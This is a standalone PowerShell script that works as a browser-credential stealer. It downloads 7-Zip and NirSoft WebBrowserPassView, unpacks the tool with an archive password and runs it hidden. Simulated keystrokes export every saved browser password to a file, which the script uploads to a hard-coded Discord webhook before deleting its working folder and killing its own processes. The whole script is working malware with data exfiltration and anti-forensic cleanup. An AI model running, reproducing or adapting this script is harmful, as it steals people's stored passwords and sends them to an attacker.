$tmpfolder = "C:\temp"

if (Test-Path $tmpfolder) { 
    Remove-Item $tmpfolder -Recurse -Force 
}

mkdir $tmpfolder
Set-Location $tmpfolder

Start-Sleep -Seconds 3

# Download the Web Browser Password View zip file
$wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
$wbpvZip = 'wbpv.zip'
$refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}

Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip

# Download the 7-Zip command line version
$sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
$sevenZipZip = '7z.zip'

Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip

# Wait for the downloads to complete
Start-Sleep -Seconds 5

# Extract the 7-Zip archive
Expand-Archive -Path $sevenZipZip -DestinationPath '7z'

# Extract the Web Browser Password View zip file using 7-Zip
$sevenZipPath = '.\7z\7za.exe'
$extractionPassword = 'wbpv28821@'
Start-Process -FilePath $sevenZipPath -ArgumentList "e", $wbpvZip, "-p$extractionPassword" -Wait

Start-Sleep -Seconds 5

Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden

Add-Type -AssemblyName System.Windows.Forms

Start-Sleep -Seconds 3

[System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
[System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait('export.html')
[System.Windows.Forms.SendKeys]::SendWait('{TAB}')
[System.Windows.Forms.SendKeys]::SendWait('h')

Start-Sleep -Seconds 3

$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
$filePath = 'C:\temp\export.htm'

Start-Sleep -Seconds 1.7

$file = Get-Item $filePath
Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }

Set-Location 'C:\temp'
$tmpfolder = 'C:\temp'
Remove-Item -Recurse -Force $tmpfolder

TASKKILL /IM "7z.exe"
TASKKILL /IM "7za.exe"
TASKKILL /IM "powershell.exe"
